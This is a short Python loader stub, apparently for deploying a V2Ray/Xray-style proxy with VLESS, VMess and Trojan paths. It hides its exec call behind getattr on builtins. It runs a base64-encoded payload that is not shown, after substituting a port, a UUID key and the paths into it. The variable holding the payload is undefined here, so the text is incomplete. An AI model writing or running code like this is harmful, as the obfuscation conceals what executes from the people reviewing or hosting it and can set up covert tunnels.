import sys
from base64 import b64decode

sys.__std__ = __builtins__
__builtins__.getattr(sys.__std__, "exec")(
    b64decode(_).decode("utf8").replace(str(int("0o17620", 8)), str(8080))
    .replace("__key__", "61f70791-32f2-49d1-a269-b61fcd204beb")
    .replace("__vl__", "/vless")
    .replace("__vm__", "/vmess")
    .replace("__tr__", "/trojan")
)